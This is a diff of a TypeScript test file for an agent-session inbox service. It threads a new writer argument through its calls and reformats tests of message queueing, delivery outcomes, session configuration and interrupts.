+      writer: messageTestWriter(),
+      sessionId: SID,
+      effort: 'ludicrous',
+    })
 
     expect(result).toEqual({ reason: 'invalid_value', detail: 'that is not a codex effort' })
     /**
@@ -2819,7 +3260,11 @@ describe('configureSession', () => {
       contractConfigure: { ok: true, effective: 'next-turn' },
     })
 
-    await h.inbox.configureSession({ sessionId: SID, model: 'gpt-5.1-codex-max' })
+    await h.inbox.configureSession({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      model: 'gpt-5.1-codex-max',
+    })
 
     /**
      * BOTH HALVES, AND NEITHER IS DECORATION (POD-3081 review found them
@@ -2830,7 +3275,7 @@ describe('configureSession', () => {
      * pushes a session list, so the control the operator just used looks like it
      * did nothing.
      */
-    expect(h.persistDraft).toHaveBeenCalledWith(h.session, expect.anything())
+    expect(h.persistDraft).toHaveBeenCalledWith(expect.anything(), h.session, expect.anything())
     expect(h.broadcast).toHaveBeenCalled()
   })
 
@@ -2841,7 +3286,11 @@ describe('configureSession', () => {
       requestedModelChanged: false,
     })
 
-    const result = await h.inbox.configureSession({ sessionId: SID, model: 'gpt-5-codex' })
+    const result = await h.inbox.configureSession({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      model: 'gpt-5-codex',
+    })
 
     // The DRIVER is still asked and still grants it — configuring a session to
     // the model it is already on is a legitimate no-op, not a refusal.
@@ -2859,7 +3308,11 @@ describe('configureSession', () => {
       contractConfigure: { reason: 'unsupported', detail: 'a TUI reads its model from argv' },
     })
 
-    await h.inbox.configureSession({ sessionId: SID, model: 'gpt-5.1-codex-max' })
+    await h.inbox.configureSession({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      model: 'gpt-5.1-codex-max',
+    })
 
     // A durable record of a change that did not happen is worse than no record:
     // it outlives the process that invented it.
@@ -2870,7 +3323,11 @@ describe('configureSession', () => {
   it('REFUSES when this server has no runtime connection, rather than confirming', async () => {
     const h = harness({ agentKind: 'codex' })
 
-    const result = await h.inbox.configureSession({ sessionId: SID, model: 'gpt-5-codex' })
+    const result = await h.inbox.configureSession({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      model: 'gpt-5-codex',
+    })
 
     // Unwired refuses, exactly like `contractInterrupt`: a setting change that
     // could not be delivered is not a setting change.
@@ -2885,7 +3342,13 @@ describe('configureSession', () => {
       contractConfigure: { ok: true, effective: 'next-turn' },
     })
 
-    expect(await h.inbox.configureSession({ sessionId: SID, model: 'gpt-5-codex' })).toMatchObject({
+    expect(
+      await h.inbox.configureSession({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        model: 'gpt-5-codex',
+      }),
+    ).toMatchObject({
       reason: 'not_running',
     })
     expect(h.contractConfigures).toEqual([])
@@ -2897,12 +3360,18 @@ describe('offer retirement before inbox admission', () => {
   function begin(h: ReturnType<typeof harness>, mode: (typeof modes)[number]) {
     if (mode === 'answer')
       return h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         interactionId: 'ixn_test',
         choices: [{ optionIndices: [1] }],
         principal: agentPrincipal(),
       })
-    const input = { sessionId: SID, text: 'continue', principal: agentPrincipal() }
+    const input = {
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'continue',
+      principal: agentPrincipal(),
+    }
     if (mode === 'queue') return h.inbox.queueText(input)
     if (mode === 'interrupt') return h.inbox.interruptText(input)
     return h.inbox.sendText(input)
@@ -2983,7 +3452,6 @@ describe('offer retirement before inbox admission', () => {
   })
 })
 
-
 describe('async ownership at attention delivery', () => {
   it.each([ALICE, null, undefined])('delivers only a resolved owner (%s)', async (owner) => {
     const h = harness({ ownerOf: async () => owner })
@@ -3004,14 +3472,30 @@ describe('async ownership at attention delivery', () => {
   })
 })
 
-
 describe('agent drain via the runtime contract', () => {
-  it.each([true, false])('retracts revoked persisted custody only when cancellation succeeds: %s', async (cancelled) => {
+  it.each([
+    true,
+    false,
+  ])('retracts revoked persisted custody only when cancellation succeeds: %s', async (cancelled) => {
     vi.useFakeTimers()
-    const h = harness({ hasBoundDriver: true, driverId: 'generic-pty',
-      authorizeAtDrain: async () => ({ ok: false, reason: 'revoked' }), contractReceipts: [] })
-    h.rows.push({ delivery: 'when-ready', id: 'revoked', sessionId: SID, queuedAt: 1, text: 'prior custody', attempts: 1,
-      deliveryOwner: 'daemon', inputOrigin: 'human', principal: agentPrincipal(), sourceMessageId: 'receipt' })
+    const h = harness({
+      hasBoundDriver: true,
+      driverId: 'generic-pty',
+      authorizeAtDrain: async () => ({ ok: false, reason: 'revoked' }),
+      contractReceipts: [],
+    })
+    h.rows.push({
+      delivery: 'when-ready',
+      id: 'revoked',
+      sessionId: SID,
+      queuedAt: 1,
+      text: 'prior custody',
+      attempts: 1,
+      deliveryOwner: 'daemon',
+      inputOrigin: 'human',
+      principal: agentPrincipal(),
+      sourceMessageId: 'receipt',
+    })
     if (!cancelled) h.contractCancel.mockResolvedValueOnce({ reason: 'busy' } as never)
     await h.inbox.drain(SID)
     await vi.advanceTimersByTimeAsync(0)
@@ -3026,28 +3510,60 @@ describe('agent drain via the runtime contract', () => {
   // id). Nothing is ever typed for agents.
   it('recovers persisted daemon custody after restart', async () => {
     vi.useFakeTimers()
-    const h = harness({ agentKind: 'codex', transcriptAvailable: true, hasBoundDriver: true,
-      driverId: 'generic-pty', contractReceipts: [] })
+    const h = harness({
+      agentKind: 'codex',
+      transcriptAvailable: true,
+      hasBoundDriver: true,
+      driverId: 'generic-pty',
+      contractReceipts: [],
+    })
     // Fresh inbox instance, only durable state survived the server.
-    h.rows.push({ delivery: 'when-ready', id: 'persisted', sessionId: SID, queuedAt: 1, text: 'already admitted', attempts: 1,
-      deliveryOwner: 'daemon', inputOrigin: 'human', principal: agentPrincipal(), sourceMessageId: 'receipt' })
+    h.rows.push({
+      delivery: 'when-ready',
+      id: 'persisted',
+      sessionId: SID,
+      queuedAt: 1,
+      text: 'already admitted',
+      attempts: 1,
+      deliveryOwner: 'daemon',
+      inputOrigin: 'human',
+      principal: agentPrincipal(),
+      sourceMessageId: 'receipt',
+    })
     await h.inbox.drain(SID, { justBound: true })
     await vi.advanceTimersByTimeAsync(60_000)
-    expect(h.contractCalls).toEqual([expect.objectContaining({ turnId: 'persisted', deliveryRecovery: true })])
+    expect(h.contractCalls).toEqual([
+      expect.objectContaining({ turnId: 'persisted', deliveryRecovery: true }),
+    ])
     expect(h.sent).toEqual([])
     expect(h.rows).toHaveLength(1)
     expect(h.applied).not.toHaveBeenCalled()
-    await h.inbox.deliveryOutcome(SID, { rowId: 'persisted', outcome: 'failed', reason: 'ambiguous prior delivery' })
+    await h.inbox.deliveryOutcome(SID, {
+      rowId: 'persisted',
+      outcome: 'failed',
+      reason: 'ambiguous prior delivery',
+    })
     expect(h.getDraft()).toBe('already admitted')
-    expect(h.promptFailed).toHaveBeenCalledWith(expect.objectContaining({ text: 'already admitted' }))
+    expect(h.promptFailed).toHaveBeenCalledWith(
+      expect.objectContaining({ text: 'already admitted' }),
+    )
     expect(h.rows).toHaveLength(0)
   })
 
   it('imports legacy attempts after restart without re-entering the typing loop', async () => {
     vi.useFakeTimers()
     const h = harness({ hasBoundDriver: true, driverId: 'generic-pty', contractReceipts: [] })
-    h.rows.push({ delivery: 'when-ready', id: 'legacy', sessionId: SID, queuedAt: 1, text: 'already typed', attempts: 2,
-      inputOrigin: 'human', principal: agentPrincipal(), sourceMessageId: null })
+    h.rows.push({
+      delivery: 'when-ready',
+      id: 'legacy',
+      sessionId: SID,
+      queuedAt: 1,
+      text: 'already typed',
+      attempts: 2,
+      inputOrigin: 'human',
+      principal: agentPrincipal(),
+      sourceMessageId: null,
+    })
     await h.inbox.drain(SID)
     await vi.advanceTimersByTimeAsync(60_000)
     expect(h.contractCalls).toEqual([expect.objectContaining({ deliveryRecovery: true })])
@@ -3058,14 +3574,24 @@ describe('agent drain via the runtime contract', () => {
   it("queues a person's chat as a steer; mail, jobs and the creation prompt wait for the boundary (POD-5855)", async () => {
     vi.useFakeTimers()
     const h = harness({ hasBoundDriver: true, driverId: 'generic-pty', contractReceipts: [] })
-    await h.inbox.queueInitialPrompt({ sessionId: SID, text: 'the first turn' })
+    await h.inbox.queueInitialPrompt({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'the first turn',
+    })
     for (const [id, inputOrigin] of [
       ['msg-chat', 'controller'],
       ['msg-mail', 'mail'],
       ['msg-job', 'system'],
       ['msg-continue', 'auto_continue'],
     ] as const) {
-      await h.inbox.queueText({ sessionId: SID, text: id, inputOrigin, sourceMessageId: id })
+      await h.inbox.queueText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: id,
+        inputOrigin,
+        sourceMessageId: id,
+      })
     }
     await vi.advanceTimersByTimeAsync(500)
     expect(Object.fromEntries(h.rows.map((row) => [row.text, row.delivery]))).toEqual({
@@ -3076,19 +3602,32 @@ describe('agent drain via the runtime contract', () => {
       'msg-continue': 'when-ready',
     })
     // The mode travels to the daemon with the row.
-    expect(h.contractCalls).toContainEqual(expect.objectContaining({ turnId: 'msg-chat', delivery: 'steer' }))
+    expect(h.contractCalls).toContainEqual(
+      expect.objectContaining({ turnId: 'msg-chat', delivery: 'steer' }),
+    )
     vi.useRealTimers()
   })
 
   it('persists custody before the RPC and carries creation-prompt identity', async () => {
     vi.useFakeTimers()
     const h = harness({ hasBoundDriver: true, driverId: 'generic-pty', contractPending: true })
-    await h.inbox.queueInitialPrompt({ sessionId: SID, text: 'create once' })
+    await h.inbox.queueInitialPrompt({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'create once',
+    })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.rows[0]).toMatchObject({ attempts: 1, deliveryOwner: 'daemon' })
-    expect(h.contractCalls).toEqual([expect.objectContaining({ initialPrompt: true, deliveryRecovery: false })])
+    expect(h.contractCalls).toEqual([
+      expect.objectContaining({ initialPrompt: true, deliveryRecovery: false }),
+    ])
     expect(h.applied).not.toHaveBeenCalled()
-    h.contractResolvers[0]!({ outcome: 'queued', position: 1, deliveredAs: 'queue', at: new Date().toISOString() })
+    h.contractResolvers[0]!({
+      outcome: 'queued',
+      position: 1,
+      deliveredAs: 'queue',
+      at: new Date().toISOString(),
+    })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.rows).toHaveLength(1)
     const event = { rowId: h.rows[0]!.id, outcome: 'failed' as const }
@@ -3102,10 +3641,22 @@ describe('agent drain via the runtime contract', () => {
   // owner is NOT asked to send it again (POD-4775).
   it('retains an unacknowledged row for late proof and retries only its custody import', async () => {
     vi.useFakeTimers()
-    const h = harness({ contractReceipts: [
-      { outcome: 'unverified', deliveredAs: 'when-ready', verificationWindowMs: 12000, at: new Date().toISOString() },
-    ] })
-    await h.inbox.queueText({ sessionId: SID, text: 'once', sourceMessageId: 'lost' })
+    const h = harness({
+      contractReceipts: [
+        {
+          outcome: 'unverified',
+          deliveredAs: 'when-ready',
+          verificationWindowMs: 12000,
+          at: new Date().toISOString(),
+        },
+      ],
+    })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'once',
+      sourceMessageId: 'lost',
+    })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.rows).toHaveLength(1)
     expect(h.getDraft()).toBeUndefined()
@@ -3135,57 +3686,76 @@ describe('agent drain via the runtime contract', () => {
   // only the daemon's fenced delivery outcome settles it. The forward path
   // never consults the ledger status, so the recovery flag alone protects
   // every known-delivery state: accepted, typed, typing and dispatched.
-  it.each([['accepted'], ['typed'], ['typing'], ['dispatched']] as const)(
-    'a recovery forward that times out never downgrades a %s row to unknown',
-    async (prior) => {
-      vi.useFakeTimers()
-      const h = harness({
-        contractReceipts: [
-          { outcome: 'unverified', deliveredAs: 'when-ready', verificationWindowMs: 12000, at: new Date().toISOString() },
-        ],
-      })
-      const id = `msg_recovery_${prior}`
-      h.rows.push({
-        delivery: 'when-ready', id, sessionId: SID, queuedAt: 1, text: 'already handed on',
-        attempts: 1, deliveryOwner: null, inputOrigin: 'human',
-        principal: agentPrincipal(), sourceMessageId: id,
-      })
-      if (prior === 'accepted') {
-        // The incident: the server already recorded accepted held=memory.
-        await h.inbox.deliveryOutcome(SID, { rowId: id, outcome: 'accepted', held: 'memory' })
-        expect(h.accepted).toHaveBeenCalledOnce()
-      }
+  it.each([
+    ['accepted'],
+    ['typed'],
+    ['typing'],
+    ['dispatched'],
+  ] as const)('a recovery forward that times out never downgrades a %s row to unknown', async (prior) => {
+    vi.useFakeTimers()
+    const h = harness({
+      contractReceipts: [
+        {
+          outcome: 'unverified',
+          deliveredAs: 'when-ready',
+          verificationWindowMs: 12000,
+          at: new Date().toISOString(),
+        },
+      ],
+    })
+    const id = `msg_recovery_${prior}`
+    h.rows.push({
+      delivery: 'when-ready',
+      id,
+      sessionId: SID,
+      queuedAt: 1,
+      text: 'already handed on',
+      attempts: 1,
+      deliveryOwner: null,
+      inputOrigin: 'human',
+      principal: agentPrincipal(),
+      sourceMessageId: id,
+    })
+    if (prior === 'accepted') {
+      // The incident: the server already recorded accepted held=memory.
+      await h.inbox.deliveryOutcome(SID, { rowId: id, outcome: 'accepted', held: 'memory' })
+      expect(h.accepted).toHaveBeenCalledOnce()
+    }
 
-      await h.inbox.drain(SID)
-      await vi.advanceTimersByTimeAsync(0)
+    await h.inbox.drain(SID)
+    await vi.advanceTimersByTimeAsync(0)
 
-      expect(h.contractCalls).toEqual([
-        expect.objectContaining({ turnId: id, deliveryRecovery: true }),
-      ])
-      expect(h.unconfirmed).not.toHaveBeenCalled()
-      expect(h.promptFailed).not.toHaveBeenCalled()
-      expect(h.rejected).toEqual([])
-      expect(h.rows).toHaveLength(1)
-      expect(h.getDraft()).toBeUndefined()
+    expect(h.contractCalls).toEqual([
+      expect.objectContaining({ turnId: id, deliveryRecovery: true }),
+    ])
+    expect(h.unconfirmed).not.toHaveBeenCalled()
+    expect(h.promptFailed).not.toHaveBeenCalled()
+    expect(h.rejected).toEqual([])
+    expect(h.rows).toHaveLength(1)
+    expect(h.getDraft()).toBeUndefined()
 
-      // Forwarded again on the next bind/sweep; still only the daemon settles it.
-      await h.inbox.drain(SID)
-      await vi.advanceTimersByTimeAsync(0)
-      expect(h.contractCalls).toEqual([
-        expect.objectContaining({ turnId: id, deliveryRecovery: true }),
-        expect.objectContaining({ turnId: id, deliveryRecovery: true }),
-      ])
-      expect(h.unconfirmed).not.toHaveBeenCalled()
-      await h.inbox.deliveryOutcome(SID, { rowId: id, outcome: 'delivered' })
-      expect(h.applied).toHaveBeenCalledTimes(1)
-      expect(h.rows).toHaveLength(0)
-    },
-  )
+    // Forwarded again on the next bind/sweep; still only the daemon settles it.
+    await h.inbox.drain(SID)
+    await vi.advanceTimersByTimeAsync(0)
+    expect(h.contractCalls).toEqual([
+      expect.objectContaining({ turnId: id, deliveryRecovery: true }),
+      expect.objectContaining({ turnId: id, deliveryRecovery: true }),
+    ])
+    expect(h.unconfirmed).not.toHaveBeenCalled()
+    await h.inbox.deliveryOutcome(SID, { rowId: id, outcome: 'delivered' })
+    expect(h.applied).toHaveBeenCalledTimes(1)
+    expect(h.rows).toHaveLength(0)
+  })
 
   it('a daemon report that cannot prove the text landed is unknown: no draft, no dead letter', async () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'maybe typed', sourceMessageId: 'msg_maybe' })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'maybe typed',
+      sourceMessageId: 'msg_maybe',
+    })
     await vi.advanceTimersByTimeAsync(0)
     await h.inbox.deliveryOutcome(SID, {
       rowId: 'msg_maybe',
@@ -3206,7 +3776,12 @@ describe('agent drain via the runtime contract', () => {
   it('a daemon that says the agent was not accepting input fails the row as never-live', async () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'never typed', sourceMessageId: 'msg_stuck' })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'never typed',
+      sourceMessageId: 'msg_stuck',
+    })
     await vi.advanceTimersByTimeAsync(0)
     await h.inbox.deliveryOutcome(SID, {
       rowId: 'msg_stuck',
@@ -3224,33 +3799,48 @@ describe('agent drain via the runtime contract', () => {
   // POD-4887: the agent program's own evidence proves a typed message is NOT
   // in its conversation. A real failure with that cause — safe to resend —
   // never `unknown`; a person's words go back to the composer.
-  it.each(['dropped-by-agent', 'not-recorded', 'agent-exited'] as const)(
-    'a daemon that proves the message is not in the conversation (%s) fails it with that cause',
-    async (cause) => {
-      vi.useFakeTimers()
-      const h = harness({ contractReceipts: [] })
-      await h.inbox.queueText({ sessionId: SID, text: 'typed, not kept', sourceMessageId: 'msg_no' })
-      await vi.advanceTimersByTimeAsync(0)
-      await h.inbox.deliveryOutcome(SID, {
-        rowId: 'msg_no',
-        outcome: 'failed',
+  it.each([
+    'dropped-by-agent',
+    'not-recorded',
+    'agent-exited',
+  ] as const)('a daemon that proves the message is not in the conversation (%s) fails it with that cause', async (cause) => {
+    vi.useFakeTimers()
+    const h = harness({ contractReceipts: [] })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'typed, not kept',
+      sourceMessageId: 'msg_no',
+    })
+    await vi.advanceTimersByTimeAsync(0)
+    await h.inbox.deliveryOutcome(SID, {
+      rowId: 'msg_no',
+      outcome: 'failed',
+      reason: 'the agent program dropped it',
+      cause,
+    })
+    expect(h.rejected).toEqual([
+      expect.objectContaining({
+        sourceMessageId: 'msg_no',
         reason: 'the agent program dropped it',
         cause,
-      })
-      expect(h.rejected).toEqual([
-        expect.objectContaining({ sourceMessageId: 'msg_no', reason: 'the agent program dropped it', cause }),
-      ])
-      expect(h.unconfirmed).not.toHaveBeenCalled()
-      expect(h.setSessionDraft).toHaveBeenCalledWith({ sessionId: SID, text: 'typed, not kept' })
-      expect(h.promptFailed).toHaveBeenCalledWith(expect.objectContaining({ unconfirmed: false }))
-      expect(h.rows).toEqual([])
-    },
-  )
+      }),
+    ])
+    expect(h.unconfirmed).not.toHaveBeenCalled()
+    expect(h.setSessionDraft).toHaveBeenCalledWith({ sessionId: SID, text: 'typed, not kept' })
+    expect(h.promptFailed).toHaveBeenCalledWith(expect.objectContaining({ unconfirmed: false }))
+    expect(h.rows).toEqual([])
+  })
 
   it('reads a failure cause it does not know as unconfirmed, never as a "no" (POD-4887)', async () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'who knows', sourceMessageId: 'msg_new' })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'who knows',
+      sourceMessageId: 'msg_new',
+    })
     await vi.advanceTimersByTimeAsync(0)
     await h.inbox.deliveryOutcome(SID, {
       rowId: 'msg_new',
@@ -3266,7 +3856,12 @@ describe('agent drain via the runtime contract', () => {
   it('hands a late proven "no" for a row no longer queued to the ledger (POD-4887)', async () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'gone', sourceMessageId: 'msg_gone' })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'gone',
+      sourceMessageId: 'msg_gone',
+    })
     await vi.advanceTimersByTimeAsync(0)
     await h.inbox.deliveryOutcome(SID, {
       rowId: 'msg_gone',
@@ -3288,7 +3883,11 @@ describe('agent drain via the runtime contract', () => {
       cause: 'agent-exited',
     })
     // An unproven failure for a row no longer queued moves nothing.
-    await h.inbox.deliveryOutcome(SID, { rowId: 'msg_gone', outcome: 'failed', cause: 'unconfirmed' })
+    await h.inbox.deliveryOutcome(SID, {
+      rowId: 'msg_gone',
+      outcome: 'failed',
+      cause: 'unconfirmed',
+    })
     expect(h.disprovenLate).toHaveBeenCalledOnce()
     expect(h.rejected).toEqual([])
   })
@@ -3300,55 +3899,72 @@ describe('agent drain via the runtime contract', () => {
   // automation's prompt (`system`) and auto-continue — not only for `mail`.
   const notAPerson = ['mail', 'steward', 'system', 'auto_continue'] as const
   const failures = [
-    ['never typed', { outcome: 'failed' as const, reason: 'no', cause: undefined }, 'delivery-failed'],
-    ['unconfirmed', { outcome: 'failed' as const, reason: 'maybe', cause: 'unconfirmed' as const }, undefined],
+    [
+      'never typed',
+      { outcome: 'failed' as const, reason: 'no', cause: undefined },
+      'delivery-failed',
+    ],
+    [
+      'unconfirmed',
+      { outcome: 'failed' as const, reason: 'maybe', cause: 'unconfirmed' as const },
+      undefined,
+    ],
   ] as const
-  it.each(notAPerson.flatMap((origin) => failures.map(([label, event, cause]) => [origin, label, event, cause] as const)))(
-    "a %s-origin %s message leaves the owner and the draft alone",
-    async (origin, _label, event, cause) => {
-      vi.useFakeTimers()
-      const h = harness({ contractReceipts: [] })
-      await h.inbox.queueText({
-        sessionId: SID,
-        text: 'not from a person',
-        sourceMessageId: 'msg_agent',
-        inputOrigin: origin,
-        principal: agentPrincipal(),
-      })
-      await vi.advanceTimersByTimeAsync(0)
-      await h.inbox.deliveryOutcome(SID, { rowId: 'msg_agent', ...event })
-      expect(h.promptFailed).not.toHaveBeenCalled()
-      expect(h.setSessionDraft).not.toHaveBeenCalled()
-      if (cause) {
-        expect(h.rejected).toEqual([expect.objectContaining({ sourceMessageId: 'msg_agent', cause })])
-      } else {
-        expect(h.unconfirmed).toHaveBeenCalledWith(
-          expect.objectContaining({ sourceMessageId: 'msg_agent' }),
-        )
-      }
-    },
-  )
+  it.each(
+    notAPerson.flatMap((origin) =>
+      failures.map(([label, event, cause]) => [origin, label, event, cause] as const),
+    ),
+  )('a %s-origin %s message leaves the owner and the draft alone', async (origin, _label, event, cause) => {
+    vi.useFakeTimers()
+    const h = harness({ contractReceipts: [] })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'not from a person',
+      sourceMessageId: 'msg_agent',
+      inputOrigin: origin,
+      principal: agentPrincipal(),
+    })
+    await vi.advanceTimersByTimeAsync(0)
+    await h.inbox.deliveryOutcome(SID, { rowId: 'msg_agent', ...event })
+    expect(h.promptFailed).not.toHaveBeenCalled()
+    expect(h.setSessionDraft).not.toHaveBeenCalled()
+    if (cause) {
+      expect(h.rejected).toEqual([expect.objectContaining({ sourceMessageId: 'msg_agent', cause })])
+    } else {
+      expect(h.unconfirmed).toHaveBeenCalledWith(
+        expect.objectContaining({ sourceMessageId: 'msg_agent' }),
+      )
+    }
+  })
 
   // `controller` is a person: it is what a person's chat and the owner's own
   // messages are typed with (the inbox's default, and the messages service's
   // origin for an operator's words); `human` is a person at the keyboard.
-  it.each(['controller', 'human'] as const)(
-    "a person's (%s-origin) message that was never typed goes back to the draft",
-    async (origin) => {
-      vi.useFakeTimers()
-      const h = harness({ contractReceipts: [] })
-      await h.inbox.queueText({ sessionId: SID, text: 'mine', sourceMessageId: 'msg_mine', inputOrigin: origin })
-      await vi.advanceTimersByTimeAsync(0)
-      await h.inbox.deliveryOutcome(SID, { rowId: 'msg_mine', outcome: 'failed', reason: 'no' })
-      expect(h.promptFailed).toHaveBeenCalledOnce()
-      expect(h.getDraft()).toBe('mine')
-    },
-  )
+  it.each([
+    'controller',
+    'human',
+  ] as const)("a person's (%s-origin) message that was never typed goes back to the draft", async (origin) => {
+    vi.useFakeTimers()
+    const h = harness({ contractReceipts: [] })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'mine',
+      sourceMessageId: 'msg_mine',
+      inputOrigin: origin,
+    })
+    await vi.advanceTimersByTimeAsync(0)
+    await h.inbox.deliveryOutcome(SID, { rowId: 'msg_mine', outcome: 'failed', reason: 'no' })
+    expect(h.promptFailed).toHaveBeenCalledOnce()
+    expect(h.getDraft()).toBe('mine')
+  })
 
   it("an agent's message to a target waiting on a person still tells the owner, without a draft", async () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'from another agent',
       sourceMessageId: 'msg_agent',
@@ -3370,7 +3986,12 @@ describe('agent drain via the runtime contract', () => {
   it("a person's message that was never typed names its cause and goes back to the draft", async () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'mine', sourceMessageId: 'msg_mine' })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'mine',
+      sourceMessageId: 'msg_mine',
+    })
     await vi.advanceTimersByTimeAsync(0)
     await h.inbox.deliveryOutcome(SID, { rowId: 'msg_mine', outcome: 'failed', reason: 'no' })
     expect(h.rejected).toEqual([expect.objectContaining({ cause: 'delivery-failed' })])
@@ -3382,6 +4003,7 @@ describe('agent drain via the runtime contract', () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
     await h.inbox.queueInitialPrompt({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'your task',
       sourceMessageId: spawnPromptMessageId(SID),
@@ -3395,14 +4017,17 @@ describe('agent drain via the runtime contract', () => {
   it('does not overwrite a newer human draft on delivery failure', async () => {
     vi.useFakeTimers()
     const h = harness({ contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'old', mutationId: asMutationId('old') })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'old',
+      mutationId: asMutationId('old'),
+    })
     await vi.advanceTimersByTimeAsync(0)
     await h.setSessionDraft({ sessionId: SID, text: 'new human draft' })
     await h.inbox.deliveryOutcome(SID, { rowId: 'old', outcome: 'failed' })
     expect(h.getDraft()).toBe('new human draft')
   })
-
-
 
   // RETIRED WITH THE FLAG-GATED ROLLOUT (POD-4279, switch removed POD-4280).
   // These tests flipped the hot delivery switch between legacy
@@ -3412,10 +4037,20 @@ describe('agent drain via the runtime contract', () => {
   // still needs a successful driver cancel, and later sends still forward.
   it("a daemon-held row leaves only on the daemon's ok; too late leaves it to its outcome", async () => {
     vi.useFakeTimers()
-    const h = harness({ agentKind: 'codex', transcriptAvailable: true, hasBoundDriver: true, driverId: 'generic-pty',
-      contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'cancel me', mutationId: asMutationId('cancel-owned'),
-      sourceMessageId: 'mail-cancel' })
+    const h = harness({
+      agentKind: 'codex',
+      transcriptAvailable: true,
+      hasBoundDriver: true,
+      driverId: 'generic-pty',
+      contractReceipts: [],
+    })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'cancel me',
+      mutationId: asMutationId('cancel-owned'),
+      sourceMessageId: 'mail-cancel',
+    })
     await vi.advanceTimersByTimeAsync(1_000)
     expect(h.contractCalls).toHaveLength(1)
     h.contractCancel.mockResolvedValueOnce({ reason: 'busy', tooLate: 'typing' })
@@ -3437,6 +4072,7 @@ describe('agent drain via the runtime contract', () => {
       sessionId: SID,
     })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'after cancel',
       mutationId: asMutationId('after-cancel'),
@@ -3449,6 +4085,7 @@ describe('agent drain via the runtime contract', () => {
   it('a row no daemon holds is withdrawn here, without asking one', async () => {
     const h = harness({ agentKind: 'codex', status: 'hibernated' })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'still here',
       sourceMessageId: 'held',
@@ -3475,6 +4112,7 @@ describe('agent drain via the runtime contract', () => {
       contractReceipts: [],
     })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'typed later?',
       mutationId: asMutationId('offline-owned'),
@@ -3518,6 +4156,7 @@ describe('agent drain via the runtime contract', () => {
       contractReceipts: [],
     })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'typed during the cut',
       mutationId: asMutationId('late-owned'),
@@ -3541,10 +4180,18 @@ describe('agent drain via the runtime contract', () => {
   // No flag, no legacy queue: agent rows forward from the first admission, and a
   // fresh bind re-admits still-pending rows flagged as recovery (idempotent by
   // turn id) instead of typing them. Nothing is ever typed for agents.
-  it.each(['generic-pty', 'codex-app-server'])('routes agent rows through the contract from admission across a fresh bind: %s', async (driverId) => {
+  it.each([
+    'generic-pty',
+    'codex-app-server',
+  ])('routes agent rows through the contract from admission across a fresh bind: %s', async (driverId) => {
     vi.useFakeTimers()
     const h = harness({ status: 'starting', agentKind: 'codex', contractReceipts: [] })
-    await h.inbox.queueText({ sessionId: SID, text: 'first bound prompt', mutationId: asMutationId('fresh-bind') })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'first bound prompt',
+      mutationId: asMutationId('fresh-bind'),
+    })
     await vi.advanceTimersByTimeAsync(400)
     expect(h.contractCalls).toEqual([expect.objectContaining({ turnId: 'fresh-bind' })])
     expect(h.sent).toEqual([])
@@ -3566,9 +4213,17 @@ describe('agent drain via the runtime contract', () => {
   // the never-types guard in inbox-gateway-delivery.test.ts pins this boundary
   // through the inbox delivery itself, including the unbound case.
   it('sends headed interrupts through the contract', async () => {
-    const h = harness({ agentKind: 'codex', phase: 'working', hasBoundDriver: true, driverId: 'generic-pty',
-      contractInterrupt: { ok: true } })
-    expect(await h.inbox.interruptTurn({ sessionId: SID })).toEqual({ ok: true, requested: 'protocol' })
+    const h = harness({
+      agentKind: 'codex',
+      phase: 'working',
+      hasBoundDriver: true,
+      driverId: 'generic-pty',
+      contractInterrupt: { ok: true },
+    })
+    expect(await h.inbox.interruptTurn({ sessionId: SID })).toEqual({
+      ok: true,
+      requested: 'protocol',
+    })
     expect(h.contractInterrupts).toEqual([SID])
     expect(h.sent).toEqual([])
   })
